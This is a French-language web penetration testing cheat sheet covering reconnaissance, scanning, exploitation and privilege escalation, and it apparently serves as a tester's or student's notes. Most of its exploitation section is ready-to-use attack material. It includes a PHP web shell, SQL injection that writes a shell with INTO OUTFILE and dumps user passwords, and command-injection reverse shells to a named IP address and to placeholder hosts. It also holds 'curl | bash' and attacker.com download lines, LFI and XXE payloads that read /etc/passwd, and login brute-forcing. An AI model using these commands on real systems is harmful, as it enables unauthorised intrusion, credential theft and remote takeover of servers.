# Fiche de Pentest Web

## 1. Reconnaissance

### Objectif : Identifier les cibles potentielles et collecter des informations sur les systèmes.

### Techniques :

- DNS Enumeration : Découverte des sous-domaines, serveurs DNS, et informations publiques.
- Port Scanning : Identification des services en écoute sur la cible.
- OSINT : Récupération d'informations publiques (emails, technologies utilisées, etc.) via des moteurs de recherche, whois, et autres outils.

### Outils :

- Extensions de navigateur comme Wappalyzer ou WhatRuns.

```bash
# dnsrecon : Découvrir des sous-domaines.
dnsrecon -d target.com -t std

# nmap : Scanner les ports ouverts et les versions des services.
nmap -p 0-1024 -v -sV target
nmap -p 80 -v 192.168.56.101 --script='http-enum'

# Options :
# -sS : scan furtif
# -A : scan agressif avec détection d'OS et de versions
# --script vuln : utilisation des scripts nmap
# -Pn : Pour ne pas faire les checks host
# -T4 : scan rapide
# -sV : detecte les services et versions
# --min-rate=1000 : si on ne détecte pas la version
# -sC: Performs a script scan using the default set of scripts. It is equivalent to --script=default.


# theHarvester : Récupérer des emails, sous-domaines, noms de personnes.
theHarvester -d target.com -b google

Amass
```

## 2. Scanning

### Objectif : Identifier les vulnérabilités exploitables.

### Techniques :

- Recherche des fichiers sensibles : Fichiers tels que robots.txt, sitemap.xml ou des fichiers de configuration accessibles.
- Test manuel des injections : Avant d'utiliser un outil automatique, tester manuellement des points d'injection (SQLi, XSS, etc.).
- Bruteforcer des répertoires : Essayer de trouver des répertoires cachés ou sensibles.
- Scan des vulnérabilités : Utiliser des scanners comme Nikto pour découvrir des vulnérabilités.
- Test manuel avant automation : Testez les injections SQL et XSS à la main avant d'utiliser des outils comme sqlmap.

### Strategie ffuf

- Commencer par essayer de rentrer un couple user/password et regarder la requête et la réponse
- Save la requête et la modifier pour mettre FUZZ à l'endroit ou on veut injecter
- fuff -t 7 -rate 70 -request Desktop/brute.res.txt -request-proto http -w path_seclist
- Si le serveur répond 200 alors que c'est faux, on met un filtre dans fuff pour voir les requêtes OK

### Outils :

- Exploit-DB
- Burp Suite
- plugin Firefox PwnFox et l’extension Burp associée

```bash
# gobuster : Bruteforce des répertoires et fichiers.
gobuster dir -u http://target.com -w /path/to/wordlist.txt -f
gobuster dir -u <url> -w /usr/share/wordlists/dirb/<wordlistsouhaité> -f

# ffuf : Outil flexible et rapide pour bruteforcer des répertoires ou des paramètres.
ffuf -u http://target.com/FUZZ -w /path/to/wordlist.txt
ffuf -u <url> -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -t 7 -rate 70 -H “User-Agent: Firefox”

# Scan SSL
sslscan target.com
./testssl.sh target.com

# Nikto : Scan des vulnérabilités web.
nikto -h http://target.com

# Nuclei

# seclist
/usr/share/seclists/

searchsploit
```

## 3. Exploitation & Intrusion

### Objectif : Exploiter les vulnérabilités découvertes pour obtenir un accès non autorisé.

### Techniques :

- Injection XSS manuelle : Tester manuellement des injections de script.

```javascript
<script>alert('XSS')</script>
```

- Upload d’un web shell : Après avoir trouvé une faille d'upload, téléverser un shell PHP.

```php
<?php system($_GET['cmd']); ?>
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

- Local File Inclusion (LFI) : /etc/passwd, /home/.ssh
  http://target.com/index.php?page=../../../../etc/passwd
  /../../../../../../../../../../../../../etc/passwd
- Remote File Inclusion (RFI) : Exploiter une vulnérabilité RFI pour exécuter un script distant.
- Log poisoning : envoie une requête avec un payload PHP qui va être loguée
  Puis accès au fichier de log dans /var/log avec une RFI pour déclencher le payload
  /var/log/ -> Google : LFI to RCE TECHNO -apache/php- (adapter la recherche en fonction de la techno)
  Injection de commande, liste de payload sur seclists
- Sites de revshells : 
  - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  - https://www.revshells.com/
  - https://github.com/swisskyrepo/PayloadsAllTheThings
  - Metasploit

```bash
# Bruteforce des logins
hydra -l admin -P /path/to/passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"

BASE64 - BASIC AUTH
https://github.com/ffuf/ffuf-scripts
./ffuf-scripts/ffuf_basicauth.sh usernames.txt passwords.txt | ffuf -w -:AUTHFUZZ -request brute.req.txt -request-proto http
echo AUTHFUZZ | base64 --decode

# Automatisation des injections sql
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --cookie=""
sqlmap -r sqlmap.req.txt --dbs
sqlmap -r sqlmap.req.txt -D dvwa --tables
sqlmap -r sqlmap.req.txt -D dvwa -T users --dump


# Web Shells : Déployer des shells web sur les serveurs compromis.
# Reverse Shells : refshell.com | Si doute soit encode ton url soit base 64 |
# Si je peux upload un fichier, j'upload un shell direct, une fois qu'il est upload on va call la page, requête GET sur mon-upload.php
nc -nlvp 4242
127.0.0.1; bash -c "bash -i >& /dev/tcp/157.90.29.76/4242 0>&1"
nc -nlvp 443
127.0.0.1; bash -c 'bash -i >& /dev/tcp/157.90.29.76/443 0>&1'


# from HTB
nc -nlvp 443
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
curl {VICTIME_IP}/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/{your_IP}/1234 0>&1"'


# passer en bash
/usr/bin/script -qc /bin/bash /dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'

# monter un serveur web pour dl des fichiers
python3 -m http.server 80 -d <chemin> 
curl http://>
wget http://>

# executer un script
cat script.sh | bash
curl http://<ip>/script.sh | bash

# Tunnel ssh
sh -f -NL 1234:localhost:5432 user@IP

# XEE
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```

### Injections SQL

```sql

-- Chercher à détecter le type d'injection possible en mettant des caractères spéciaux
' or 1=1 --
-- Détecter le nombre de colonnes :
' ORDER BY 1 --
' ORDER BY 2 --

-- Liste des DB 
' UNION SELECT schema_name FROM information_schema.schemata -- -
-- Liste des tables d'une DB
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
-- Explorer les colonnes
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'dvwa' -- -
-- Détails des colonnes d'une table
' UNION SELECT group_concat(user) FROM dvwa.users -- -

' UNION SELECT COUNT(*) FROM dvwa.users -- -
' UNION SELECT username FROM dvwa.users LIMIT 1 OFFSET 0 -- -
' UNION SELECT password FROM dvwa.users LIMIT 1 OFFSET 1 -- -

-- SQLITE
' UNION SELECT sql FROM sqlite_master WHERE type='table' -- -
' UNION SELECT name FROM sqlite_master WHERE type='table' -- -
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users' -- -
' UNION SELECT username FROM users -- -
' UNION SELECT password FROM users -- -

' UNION SELECT COUNT(*) FROM users -- -
' UNION SELECT username FROM users LIMIT 1 OFFSET 0 -- -
' UNION SELECT password FROM users LIMIT 1 OFFSET 1 -- -



Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

- Crack de hash / bruteforce password local

```bash
# Hasher un zip
zip2john backup.zip > hashes

# Bruteforce le hash
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
john --show hashes

# Voir l'identité d'un hash (fonction de hash)
hashid 2cb42f8734ea607eefed3b70af13bbd3

# Bruteforce le hash
echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

## 4. Élévation de Privilèges

### Objectif : Escalade de privilèges et maintien de l’accès.

### Techniques :

- Escalade locale : Rechercher des configurations mal sécurisées.
- Backdoors : Utiliser des backdoors pour garder un accès.

### Stratégie

- version de linux -> exploit ?
- historique utilisateur, bashrc, bash history, variable ENV
- si y'a des cron qui tournent avec des droits en écriture le mettre
- GTFOBins, LOLBins sur la machine qui peuvent servir à faire une elevation de privilège -> va sur GTFO et regarde comment l'exploiter : gtfobins.github.io
- sudo -l pour voir ce que tu peux exec en root, et si un binaire regarde sur GTFO
- find / -perm -u=s -type f 2>/dev/null -> sort une liste de binaire et regarde s'ils sont en GTFO

### Outils :

- Mimikatz, Linpeas.sh
- GTFOBins, LOLBins

```bash
- linpeas.sh : Script d’audit pour découvrir des moyens d’escalader les privilèges.
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# regarder les groups du users
id
# regarder les binaires liés à un group
find / -group bugtracker 2>/dev/null
# infos sur un fichier (looking for setuid, suid)
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

sudo -l
crontab -l
env
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null
getcap -r / 2>/dev/null

ps aux
ss -tln
netstat -taupen
```

## Astuces Globales

- Serveur Web Python : Utiliser un serveur web Python pour servir des fichiers à la cible ou télécharger des fichiers depuis la cible.
  python3 -m http.server 8000
- Passer en bash :
  /usr/bin/script -qc /bin/bash /dev/null
- Encodage Base64 : Si une URL est filtrée, essaie de l’encoder en Base64.
  echo "payload" | base64
- Créer un tunnel SSH : Utiliser SSH pour rediriger le trafic.
  ssh -L 8080:target.com:80 user@target.com
- Reverse Shell via Netcat :
  nc -lvnp 4444
- plugin Firefox PwnFox et l’extension Burp associée
